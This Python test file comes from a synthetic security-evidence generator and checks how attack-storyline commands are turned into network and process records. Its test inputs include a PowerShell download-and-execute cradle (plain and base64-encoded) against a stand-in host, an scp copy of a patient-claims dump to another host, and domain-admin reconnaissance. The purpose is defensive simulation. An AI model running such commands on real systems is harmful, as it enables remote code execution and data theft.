# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for network evidence inferred from storyline commands."""

from datetime import UTC, datetime
from types import SimpleNamespace
from typing import Any

from evidenceforge.generation.activity.timing_profiles import (
    sample_packet_timing_delta,
    sample_timing_delta,
)
from evidenceforge.generation.engine.storyline import StorylineMixin
from evidenceforge.models.scenario import System, User


class TestStorylineCommandNetworks:
    def test_extract_http_url_from_powershell_download(self):
        url = StorylineMixin._extract_http_url(
            'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('
            "'https://cdn.example.test/stage.ps1')\""
        )

        assert url == "https://cdn.example.test/stage.ps1"

    def test_extract_http_url_from_encoded_powershell_download(self):
        url = StorylineMixin._extract_http_url(
            "powershell.exe -NoProfile -EncodedCommand "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAuAGUAeABhAG0AcABsAGUALgB0AGUAcwB0AC8AcwB0AGEAZwBlAC4AcABzADEAIgApAA=="
        )

        assert url == "https://cdn.example.test/stage.ps1"

    def test_parse_http_url_target_accepts_valid_url(self):
        target = StorylineMixin._parse_http_url_target("https://cdn.example.test:8443/stage.ps1")

        assert target == ("cdn.example.test", 8443)

    def test_parse_http_url_target_rejects_non_numeric_port(self):
        target = StorylineMixin._parse_http_url_target("http://example.com:bad/path")

        assert target is None

    def test_parse_http_url_target_rejects_malformed_bracketed_host(self):
        target = StorylineMixin._parse_http_url_target("http://[not-a-valid-host/path")

        assert target is None

    def test_extract_scp_target_from_remote_destination(self):
        target = StorylineMixin._extract_scp_target(
            "scp /tmp/patient_claims.sql.gz root@10.10.2.30:/var/tmp/",
            "linux",
        )

        assert target == "10.10.2.30"

    def test_resolve_storyline_network_target_matches_fqdn(self):
        engine = object.__new__(StorylineMixin)
        engine._ad_domain = "meridianhcs.local"
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(
                systems=[
                    System(
                        hostname="APP-INT-01",
                        ip="10.10.2.30",
                        os="Ubuntu 22.04",
                        type="server",
                    )
                ]
            )
        )

        assert engine._resolve_storyline_network_target("APP-INT-01.meridianhcs.local") == (
            "10.10.2.30"
        )

    def test_storyline_authored_ip_for_hostname_uses_explicit_dns_answer(self):
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(
                            type="dns_query",
                            query="cdn-assets-update.com",
                            answer="45.33.32.30",
                        )
                    ]
                )
            ]
        )

        assert engine._storyline_authored_ip_for_hostname("cdn-assets-update.com") == (
            "45.33.32.30"
        )


class _FakeActivityGenerator:
    def __init__(self) -> None:
        self.reserved_ports: list[int] = []
        self.connections: list[dict] = []
        self.explicit_credentials: list[dict] = []
        self.processes: list[dict] = []
        self.dhcp_leases: list[dict] = []

    def generate_bash_command(self, *args: Any, **kwargs: Any) -> None:
        return None

    def _resolve_parent(self, *args: Any, **kwargs: Any) -> int:
        return 1

    def generate_process(self, *args: Any, **kwargs: Any) -> int:
        self.processes.append(kwargs)
        return 4242

    def generate_logon(self, *args: Any, **kwargs: Any) -> str:
        return "0xabc"

    def _record_user_process(self, *args: Any, **kwargs: Any) -> None:
        return None

    def reserve_ssh_source_port(self, *args: Any, **kwargs: Any) -> int:
        self.reserved_ports.append(45678)
        return 45678

    def generate_connection(self, **kwargs: Any) -> str:
        self.connections.append(kwargs)
        return "Cscptransfer00001"

    def generate_explicit_credentials(self, **kwargs: Any) -> None:
        self.explicit_credentials.append(kwargs)

    def generate_dhcp_lease(self, **kwargs: Any) -> None:
        self.dhcp_leases.append(kwargs)

    def _expand_and_emit(self, *args: Any, **kwargs: Any) -> None:
        return None


class _FakeStateManager:
    def get_sessions_for_user(self, username: str) -> list[SimpleNamespace]:
        return [SimpleNamespace(system="SRC", logon_id="0xabc")]

    def mark_story_process(self, hostname: str, pid: int) -> None:
        return None


class TestStorylineScpCorrelation:
    def test_scp_receiver_artifacts_reuse_network_source_port(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.0.20",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source, target], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        receiver_kwargs: list[dict[str, Any]] = []

        def capture_receiver_artifacts(**kwargs) -> None:
            receiver_kwargs.append(kwargs)

        engine._emit_scp_receiver_artifacts = capture_receiver_artifacts
        spec = SimpleNamespace(
            type="process",
            process_name="scp",
            command_line="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="copy archive to staging host",
            explicit_types={"process"},
        )

        assert engine.activity_generator.reserved_ports == [45678]
        assert engine.activity_generator.connections[0]["src_port"] == 45678
        assert [kwargs["source_port"] for kwargs in receiver_kwargs] == [45678]

        receiver = receiver_kwargs[0]
        transfer_time = receiver["transfer_time"]
        zeek_start_time = transfer_time + sample_timing_delta(
            "source.zeek_conn_start",
            seed_parts=(
                source.ip,
                45678,
                target.ip,
                22,
                "tcp",
                "ssh",
                transfer_time,
            ),
        )
        expected_connection_log_time = zeek_start_time + sample_packet_timing_delta(
            "source.sshd_connection_after_zeek",
            seed_parts=(
                target.hostname,
                source.ip,
                45678,
                "root",
                transfer_time.isoformat(),
            ),
        )
        assert receiver["connection_log_time"] == expected_connection_log_time
        assert receiver["connection_log_time"] > zeek_start_time

    def test_net_domain_queries_do_not_auto_emit_4648(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 10",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="net.exe",
            command_line='net group "Domain Admins" /domain',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="query domain admins",
            explicit_types={"process"},
        )

        assert engine.activity_generator.explicit_credentials == []

    def test_service_backed_process_does_not_emit_second_payload_file_create(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\PSEXESVC.exe",
            command_line="PSEXESVC.exe -accepteula",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="start service",
            explicit_types={"process", "service_installed"},
        )

        assert engine.activity_generator.processes[0]["ensure_file_event"] is False

    def test_process_url_network_reuses_storyline_authored_domain_ip(self):
        source = System(
            hostname="DC-01",
            ip="10.10.2.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[]),
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(
                            type="connection",
                            hostname="cdn-assets-update.com",
                            dst_ip="45.33.32.30",
                        )
                    ]
                )
            ],
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="powershell.exe",
            command_line=(
                "powershell.exe -NoProfile -Command "
                "\"Invoke-WebRequest -Uri 'https://cdn-assets-update.com/health.ps1'\""
            ),
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="download health script",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[-1]
        assert conn["dst_ip"] == "45.33.32.30"
        assert conn["hostname"] == "cdn-assets-update.com"
        assert conn["preserve_dst_ip"] is True

    def test_storyline_dhcp_lease_reuses_existing_host_lease_identity(self):
        source = System(
            hostname="ROGUE-LAPTOP",
            ip="10.10.1.99",
            os="Kali Linux",
            type="workstation",
        )
        actor = User(
            username="root",
            full_name="Root",
            email="root@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(environment=SimpleNamespace(systems=[source]))
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        engine._infra_ips = {"dc": ["10.10.2.10"]}
        engine._dhcp_lease_state = {
            "ROGUE-LAPTOP": {
                "mac": "f0:1f:af:b7:35:b2",
                "lease_time": 7200.0,
                "last_renewal": 1710763200.0,
                "system": source,
            }
        }
        spec = SimpleNamespace(type="dhcp_lease", requested_ip=None, mac_address=None)

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="renew lease",
            explicit_types={"dhcp_lease"},
        )

        lease = engine.activity_generator.dhcp_leases[0]
        assert lease["mac"] == "f0:1f:af:b7:35:b2"
        assert lease["lease_time"] == 7200.0
        assert lease["msg_types"] == ["REQUEST", "ACK"]
